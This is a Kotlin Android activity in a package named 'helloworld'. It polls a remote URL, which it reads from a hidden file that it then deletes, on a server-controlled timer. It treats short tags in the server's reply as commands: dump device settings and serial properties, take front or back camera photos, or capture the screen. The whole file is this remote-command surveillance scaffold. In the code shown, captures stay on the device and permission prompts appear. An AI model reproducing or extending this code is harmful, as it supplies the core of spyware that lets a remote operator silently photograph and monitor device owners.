package com.example.helloworld

import android.Manifest
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.media.ImageReader
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.widget.ImageView
import android.widget.TextView
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import androidx.camera.core.CameraSelector
import androidx.camera.core.ImageCapture
import androidx.camera.core.ImageCaptureException
import androidx.camera.lifecycle.ProcessCameraProvider
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import java.io.File
import java.io.FileOutputStream
import java.net.HttpURLConnection
import java.net.URL

class MainActivity : AppCompatActivity() {

    private lateinit var textView: TextView
    private lateinit var imageView: ImageView
    private var yaEjecutado = false

    private val scope = CoroutineScope(Dispatchers.Main + SupervisorJob())
    private var refreshJob: Job? = null

    @Volatile
    private var refreshSegundos = 0

    private var pendingPhotoFrontal: Boolean? = null

    private val cameraPermissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestPermission()
    ) { granted ->
        val pending = pendingPhotoFrontal
        pendingPhotoFrontal = null
        if (granted && pending != null) {
            tomarFotoInternal(pending)
        } else {
            textView.text = "Permiso de cámara denegado"
        }
    }

    private val mediaProjectionLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) { result ->
        if (result.resultCode == RESULT_OK && result.data != null) {
            val mpm = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
            val projection = mpm.getMediaProjection(result.resultCode, result.data!!)
            capturarPantalla(projection)
        } else {
            textView.text = "Permiso de captura denegado"
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        textView = findViewById(R.id.myTextView)
        imageView = findViewById(R.id.myImageView)

        if (tienePermisoTotal()) {
            ejecutarFlujo()
        } else {
            textView.text = "Concede el permiso de acceso a archivos para continuar..."
            pedirPermisoTotal()
        }
    }

    override fun onResume() {
        super.onResume()
        if (!yaEjecutado && tienePermisoTotal()) {
            textView.postDelayed({ if (!yaEjecutado) ejecutarFlujo() }, 300)
        }
    }

    override fun onDestroy() {
        refreshJob?.cancel()
        scope.cancel()
        super.onDestroy()
    }

    // ---------------- FLUJO PRINCIPAL ----------------

    private fun ejecutarFlujo() {
        if (yaEjecutado) return
        yaEjecutado = true

        val prefs = getSharedPreferences("config", MODE_PRIVATE)
        val urlDesdeArchivo = importarConfiguracion()
        val targetUrl = urlDesdeArchivo
            ?: prefs.getString("url", "https://example.com")
            ?: "https://example.com"

        textView.text = "Cargando $targetUrl ..."

        scope.launch {
            try {
                val html = withContext(Dispatchers.IO) { fetchHtml(targetUrl) }
                procesarRespuesta(html, targetUrl)
            } catch (e: Exception) {
                textView.text = "Error: ${e.message}\nURL: $targetUrl"
            }
        }
    }

    private fun procesarRespuesta(html: String, url: String) {
        // 1. Control del auto-refresh
        if (html.contains("<aus/>")) {
            pararAutoRefresh()
        } else {
            val auRegex = Regex("<au/>\\s*(\\d+)\\s*</au>")
            val match = auRegex.find(html)
            if (match != null) {
                val n = match.groupValues[1].toIntOrNull() ?: 0
                if (n > 0) iniciarAutoRefresh(n)
            } else if (refreshJob?.isActive != true) {
                val saved = getSharedPreferences("config", MODE_PRIVATE)
                    .getInt("auto_refresh_seconds", 0)
                if (saved > 0) iniciarAutoRefresh(saved)
            }
        }

        // 2. Acciones por etiqueta
        var handled = false
        if (html.contains("<gdi/>")) {
            textView.text = obtenerInfoDispositivo()
            handled = true
        }
        if (html.contains("<tff/>")) {
            tomarFoto(frontal = true)
            handled = true
        }
        if (html.contains("<tfb/>")) {
            tomarFoto(frontal = false)
            handled = true
        }
        if (html.contains("<ts/>")) {
            pedirScreenshot()
            handled = true
        }
        if (!handled) {
            textView.text = html
        }
    }

    // ---------------- AUTO REFRESH ----------------

    private fun iniciarAutoRefresh(segundos: Int) {
        val prefs = getSharedPreferences("config", MODE_PRIVATE)
        prefs.edit().putInt("auto_refresh_seconds", segundos).apply()
        refreshSegundos = segundos

        if (segundos <= 0) {
            pararAutoRefresh()
            return
        }

        if (refreshJob?.isActive == true) return

        refreshJob = scope.launch {
            while (isActive) {
                val seg = refreshSegundos
                if (seg <= 0) break
                delay(seg * 1000L)
                if (!isActive) break
                if (refreshSegundos != seg) continue
                val url = getSharedPreferences("config", MODE_PRIVATE)
                    .getString("url", "https://example.com") ?: "https://example.com"
                try {
                    val html = withContext(Dispatchers.IO) { fetchHtml(url) }
                    withContext(Dispatchers.Main) { procesarRespuesta(html, url) }
                } catch (_: Exception) {
                }
            }
        }
    }

    private fun pararAutoRefresh() {
        refreshSegundos = 0
        refreshJob?.cancel()
        refreshJob = null
    }

    // ---------------- CONFIG ----------------

    private fun importarConfiguracion(): String? {
        val prefs = getSharedPreferences("config", MODE_PRIVATE)
        val archivo = File(
            Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS),
            "u.tmp"
        )
        if (!archivo.exists()) return null

        val url: String
        try {
            url = archivo.readText().trim()
        } catch (e: Exception) {
            prefs.edit().putString("last_error", "No se pudo leer u.tmp: ${e.message}").apply()
            return null
        }

        if (url.isEmpty()) {
            archivo.delete()
            prefs.edit().putString("last_error", "u.tmp estaba vacío").apply()
            return null
        }

        prefs.edit().putString("url", url).remove("last_error").commit()
        if (!archivo.delete()) {
            prefs.edit().putString("last_error", "No se pudo borrar u.tmp").apply()
        }
        return url
    }

    // ---------------- PERMISOS ----------------

    private fun tienePermisoTotal(): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            Environment.isExternalStorageManager()
        } else {
            ContextCompat.checkSelfPermission(
                this, Manifest.permission.READ_EXTERNAL_STORAGE
            ) == PackageManager.PERMISSION_GRANTED
        }
    }

    private fun pedirPermisoTotal() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            val intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION)
            intent.data = Uri.parse("package:$packageName")
            startActivity(intent)
        } else {
            ActivityCompat.requestPermissions(
                this,
                arrayOf(
                    Manifest.permission.READ_EXTERNAL_STORAGE,
                    Manifest.permission.WRITE_EXTERNAL_STORAGE
                ),
                100
            )
        }
    }

    // ---------------- HTTP ----------------

    private fun fetchHtml(urlString: String): String {
        val url = URL(urlString)
        val conn = url.openConnection() as HttpURLConnection
        conn.requestMethod = "GET"
        conn.connectTimeout = 5000
        conn.readTimeout = 5000
        return try {
            conn.inputStream.bufferedReader().use { it.readText() }
        } finally {
            conn.disconnect()
        }
    }

    // ---------------- INFO DISPOSITIVO ----------------

    private fun obtenerInfoDispositivo(): String {
        val sb = StringBuilder()
        sb.appendLine("=== BUILD ===")
        sb.appendLine("MANUFACTURER: ${Build.MANUFACTURER}")
        sb.appendLine("BRAND: ${Build.BRAND}")
        sb.appendLine("MODEL: ${Build.MODEL}")
        sb.appendLine("DEVICE: ${Build.DEVICE}")
        sb.appendLine("PRODUCT: ${Build.PRODUCT}")
        sb.appendLine("HARDWARE: ${Build.HARDWARE}")
        sb.appendLine("BOARD: ${Build.BOARD}")
        sb.appendLine("BOOTLOADER: ${Build.BOOTLOADER}")
        sb.appendLine("DISPLAY: ${Build.DISPLAY}")
        sb.appendLine("ID: ${Build.ID}")
        sb.appendLine("FINGERPRINT: ${Build.FINGERPRINT}")
        sb.appendLine("VERSION.RELEASE: ${Build.VERSION.RELEASE}")
        sb.appendLine("VERSION.SDK_INT: ${Build.VERSION.SDK_INT}")
        sb.appendLine("VERSION.CODENAME: ${Build.VERSION.CODENAME}")
        sb.appendLine("VERSION.INCREMENTAL: ${Build.VERSION.INCREMENTAL}")
        sb.appendLine()
        sb.appendLine("=== SETTINGS.SYSTEM ===")
        sb.appendLine(volcarSettings(Settings.System.CONTENT_URI))
        sb.appendLine()
        sb.appendLine("=== SETTINGS.SECURE ===")
        sb.appendLine(volcarSettings(Settings.Secure.CONTENT_URI))
        sb.appendLine()
        sb.appendLine("=== SETTINGS.GLOBAL ===")
        sb.appendLine(volcarSettings(Settings.Global.CONTENT_URI))
        sb.appendLine()
        sb.appendLine("=== SYSTEM PROPERTIES ===")
        sb.appendLine(volcarSystemProperties())
        return sb.toString()
    }

    private fun volcarSettings(uri: Uri): String {
        val sb = StringBuilder()
        try {
            val cursor = contentResolver.query(uri, null, null, null, null)
            cursor?.use {
                val nameIndex = it.getColumnIndex("name")
                val valueIndex = it.getColumnIndex("value")
                if (nameIndex == -1 || valueIndex == -1) return "Columnas no encontradas"
                while (it.moveToNext()) {
                    sb.appendLine("${it.getString(nameIndex)} = ${it.getString(valueIndex)}")
                }
            }
        } catch (e: Exception) {
            sb.appendLine("Error al leer $uri: ${e.message}")
        }
        return sb.toString()
    }

    private fun volcarSystemProperties(): String {
        val sb = StringBuilder()
        try {
            val clazz = Class.forName("android.os.SystemProperties")
            val getMethod = clazz.getMethod("get", String::class.java)
            val props = listOf(
                "ro.product.model", "ro.product.brand", "ro.product.manufacturer",
                "ro.build.version.release", "ro.build.version.sdk", "ro.build.id",
                "ro.build.display.id", "ro.serialno", "ro.boot.serialno",
                "persist.sys.timezone", "persist.sys.language", "persist.sys.country",
                "net.hostname", "ro.debuggable", "ro.secure", "ro.build.type", "ro.build.tags"
            )
            for (prop in props) {
                val value = getMethod.invoke(null, prop) as? String ?: "null"
                sb.appendLine("$prop = $value")
            }
        } catch (e: Exception) {
            sb.appendLine("Error: ${e.message}")
        }
        return sb.toString()
    }

    // ---------------- CÁMARA ----------------

    private fun tomarFoto(frontal: Boolean) {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA)
            == PackageManager.PERMISSION_GRANTED) {
            tomarFotoInternal(frontal)
        } else {
            pendingPhotoFrontal = frontal
            cameraPermissionLauncher.launch(Manifest.permission.CAMERA)
        }
    }

    private fun tomarFotoInternal(frontal: Boolean) {
        val cameraProviderFuture = ProcessCameraProvider.getInstance(this)
        cameraProviderFuture.addListener({
            try {
                val cameraProvider = cameraProviderFuture.get()
                val selector = if (frontal) CameraSelector.DEFAULT_FRONT_CAMERA
                               else CameraSelector.DEFAULT_BACK_CAMERA
                val imageCapture = ImageCapture.Builder()
                    .setCaptureMode(ImageCapture.CAPTURE_MODE_MINIMIZE_LATENCY)
                    .build()

                val dir = File(getExternalFilesDir(Environment.DIRECTORY_PICTURES), "fotos")
                    .apply { mkdirs() }
                val file = File(
                    dir,
                    "foto_${if (frontal) "frontal" else "trasera"}_${System.currentTimeMillis()}.jpg"
                )
                val outputOptions = ImageCapture.OutputFileOptions.Builder(file).build()

                cameraProvider.unbindAll()
                cameraProvider.bindToLifecycle(this, selector, imageCapture)

                imageCapture.takePicture(
                    outputOptions,
                    ContextCompat.getMainExecutor(this),
                    object : ImageCapture.OnImageSavedCallback {
                        override fun onImageSaved(outputFileResults: ImageCapture.OutputFileResults) {
                            imageView.setImageURI(Uri.fromFile(file))
                            textView.text = "Foto guardada en: ${file.absolutePath}"
                        }
                        override fun onError(exception: ImageCaptureException) {
                            textView.text = "Error al tomar foto: ${exception.message}"
                        }
                    }
                )
            } catch (e: Exception) {
                textView.text = "Error de cámara: ${e.message}"
            }
        }, ContextCompat.getMainExecutor(this))
    }

    // ---------------- SCREENSHOT ----------------

    private fun pedirScreenshot() {
        val serviceIntent = Intent(this, ScreenshotService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            ContextCompat.startForegroundService(this, serviceIntent)
        } else {
            startService(serviceIntent)
        }

        val mpm = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        mediaProjectionLauncher.launch(mpm.createScreenCaptureIntent())
    }

    private fun capturarPantalla(projection: MediaProjection) {
        val metrics = resources.displayMetrics
        val width = metrics.widthPixels
        val height = metrics.heightPixels
        val density = metrics.densityDpi

        val imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2)
        val virtualDisplay = projection.createVirtualDisplay(
            "screenshot", width, height, density,
            DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
            imageReader.surface, null, null
        )

        Handler(Looper.getMainLooper()).postDelayed({
            var bitmap: Bitmap? = null
            try {
                val image = imageReader.acquireLatestImage()
                if (image != null) {
                    val planes = image.planes
                    val buffer = planes[0].buffer
                    val pixelStride = planes[0].pixelStride
                    val rowStride = planes[0].rowStride
                    val rowPadding = rowStride - pixelStride * width
                    val bmp = Bitmap.createBitmap(
                        width + rowPadding / pixelStride, height, Bitmap.Config.ARGB_8888
                    )
                    bmp.copyPixelsFromBuffer(buffer)
                    image.close()
                    bitmap = bmp
                }
            } catch (e: Exception) {
                textView.text = "Error al capturar: ${e.message}"
            } finally {
                virtualDisplay.release()
                imageReader.close()
                try { projection.stop() } catch (_: Exception) {}
                stopService(Intent(this, ScreenshotService::class.java))
            }

            val bmp = bitmap
            if (bmp != null) {
                val dir = File(getExternalFilesDir(Environment.DIRECTORY_PICTURES), "screenshots")
                    .apply { mkdirs() }
                val file = File(dir, "screenshot_${System.currentTimeMillis()}.png")
                try {
                    FileOutputStream(file).use { out ->
                        bmp.compress(Bitmap.CompressFormat.PNG, 100, out)
                    }
                    imageView.setImageBitmap(bmp)
                    textView.text = "Screenshot guardado en: ${file.absolutePath}"
                } catch (e: Exception) {
                    textView.text = "Error al guardar: ${e.message}"
                }
            }
        }, 800)
    }
}
